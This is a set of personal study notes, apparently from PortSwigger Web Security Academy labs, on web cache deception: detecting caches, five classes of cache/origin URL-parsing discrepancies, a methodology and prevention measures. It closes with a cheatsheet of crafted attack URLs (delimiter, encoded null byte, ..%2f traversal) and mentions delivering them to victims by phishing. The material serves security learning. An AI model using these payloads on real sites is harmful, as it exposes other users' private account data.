# Web Cache Deception
**Source:** PortSwigger Web Security Academy
**Status:** ✅ Completed
**Date:** September 2026
**Author:** [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py)

---

## Table of Contents
1. [What is Web Cache Deception](#what-is-web-cache-deception)
2. [Detection](#detection)
3. [Attack 1 — Static Extension Rules](#attack-1--static-extension-rules)
4. [Attack 2 — Path Mapping Discrepancies](#attack-2--path-mapping-discrepancies)
5. [Attack 3 — Delimiter Discrepancies](#attack-3--delimiter-discrepancies)
6. [Attack 4 — Normalization Discrepancies](#attack-4--normalization-discrepancies)
7. [Attack 5 — Filename Cache Rules](#attack-5--filename-cache-rules)
8. [Methodology](#methodology)
9. [Prevention](#prevention)
10. [Quick Reference Cheatsheet](#quick-reference-cheatsheet)

---

## What is Web Cache Deception

Exploits discrepancy between how the **cache** and **origin server** interpret the same URL.

```
Cache thinks:  static file → store it!
Origin thinks: dynamic page → returns sensitive data!

Result: sensitive user data stored in shared cache
        anyone can retrieve it unauthenticated!
```

**Cache key:** identifier used by cache to match requests
(usually URL path + some headers)

**Cache rules:** what gets stored
```
Extensions: .css .js .jpg .png .ico → cached
Prefixes: /static/ /assets/ → cached  
Filenames: robots.txt favicon.ico → cached
Dynamic: /profile /account → NOT cached
```

---

## Detection

**X-Cache header:**
```
X-Cache: hit      → served from cache
X-Cache: miss     → served from origin
X-Cache: dynamic  → cannot be cached
X-Cache: refresh  → cache refreshed
```

**Confirm caching:**
```
Send same request twice:
Request 1 → X-Cache: miss (origin)
Request 2 → X-Cache: hit  (cached!) ✅
```

**Tools:**
```
Burp Param Miner → Settings → Add dynamic cachebuster
Web Cache Deception Scanner BApp
```

---

## Attack 1 — Static Extension Rules

Append static extension to dynamic URL:

```
/api/user/profile     → not cached
/api/user/profile.js  → cached! (.js = static)

Cache: .js = static → CACHE IT ✅
Origin: ignores .js → returns profile data ✅
```

**Extensions to try:**
```
.js .css .ico .png .jpg .woff .svg .exe
```

---

## Attack 2 — Path Mapping Discrepancies

Exploit REST-style servers that ignore extra path segments:

```
/api/orders/123        → returns order data
/api/orders/123/foo    → same response! (REST-style)

/api/orders/123/foo.css
Cache: .css = static → CACHE IT ✅
Origin: ignores /foo.css → returns order data ✅
```

---

## Attack 3 — Delimiter Discrepancies

Different frameworks treat characters as delimiters differently:

**Semicolon (;):**
```
/profile;foo.css

Java Spring: ; = delimiter → sees /profile → data ✅
Cache: no delimiter → sees /profile;foo.css → .css → CACHE ✅
```

**Ruby on Rails dot handling:**
```
/profile.css  → Rails: CSS format → error
/profile.ico  → Rails: unknown → ignores → returns /profile ✅
Cache: .ico → CACHE ✅
```

**OpenLightSpeed encoded delimiters:**
```
/profile%00foo.css  → null byte
/profile%23foo.css  → encoded #
/profile%3ffoo.css  → encoded ?
```

**Finding delimiter discrepancies:**
```
Step 1: GET /settings/list → baseline response
Step 2: GET /settings/listaaa → same? → REST-style ✅
Step 3: GET /settings/list;aaa → same? → ; is delimiter ✅
Step 4: GET /settings/list;aaa.css → cached? → VULNERABLE! 🎯
```

**Encoded delimiter decoding discrepancy:**
```
/myaccount%3fwcd.css

Cache: sees .css → CACHE ✅
Origin: decodes %3f → ? → path = /myaccount → data ✅
```

---

## Attack 4 — Normalization Discrepancies

**Origin normalises, cache does not:**
```
/assets/..%2fprofile

Cache: /assets prefix → CACHE ✅ (doesn't decode %2f)
Origin: decodes → /assets/../profile → /profile → data ✅
```

**Cache normalises, origin does not:**
```
/profile;%2f%2e%2e%2fstatic

Cache: normalises → /static → CACHE ✅
Origin: ; = delimiter → sees /profile → data ✅
```

**Must encode everything after first slash:**
```
%2f = /
%2e = .
%2e%2e = ..
```

**Confirming cache doesn't normalise:**
```
GET /aaa/..%2fassets/js/stockCheck.js
→ Not cached → cache doesn't normalise ✅ good for attack
→ Still cached → cache normalises ❌

GET /assets/aaa (no extension)
→ Cached → PREFIX based rule ✅
→ Not cached → EXTENSION based rule
```

---

## Attack 5 — Filename Cache Rules

Caches that store specific filenames:
```
robots.txt → always cached
favicon.ico → always cached
index.html → always cached
```

**Path traversal to reach filename:**
```
/profile/..%2frobots.txt

Cache: filename = robots.txt → CACHE ✅
Origin: normalises → /profile → data ✅
```

---

## Methodology

```
1. DETECT cache (X-Cache header, send twice)
2. MAP sensitive dynamic endpoints
3. IDENTIFY cache rules (extension/prefix/filename)
4. TEST discrepancies:
   → Append extensions (.js .css .ico)
   → Append path segments (/abc.js)
   → Test delimiters (; . %00 %23 %3f)
   → Test path traversal (..%2f)
5. VERIFY unauthenticated access to cached data
6. EXPLOIT (deliver URL to victim via phishing/XSS)
```

---

## Prevention

```
→ Cache-Control: no-store, private on sensitive endpoints
→ Consistent URL parsing across all components
→ Content-Type based caching not URL patterns
→ Vary: Cookie header on authenticated responses
→ Strict URL validation — reject unexpected segments
```

---

## Quick Reference Cheatsheet

```
BASIC ATTACKS
/profile.js              → static extension
/profile/abc.js          → path segment + extension

DELIMITER ATTACKS
/profile;foo.css         → semicolon delimiter
/profile.ico             → dot (Rails bypass)
/profile%00foo.css       → null byte
/profile%23foo.css       → encoded #
/profile%3ffoo.css       → encoded ?

PATH TRAVERSAL ATTACKS
/static/..%2fprofile     → origin normalises
/profile;%2f%2e%2e%2fstatic → cache normalises
/profile/..%2frobots.txt → filename rule

DETECTION
X-Cache: miss → hit = caching confirmed
Param Miner cachebuster
WCD Scanner BApp

TOOLS
Burp Repeater + Param Miner
Web Cache Deception Scanner BApp
```

---

*Notes by [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py) | PortSwigger Web Security Academy*
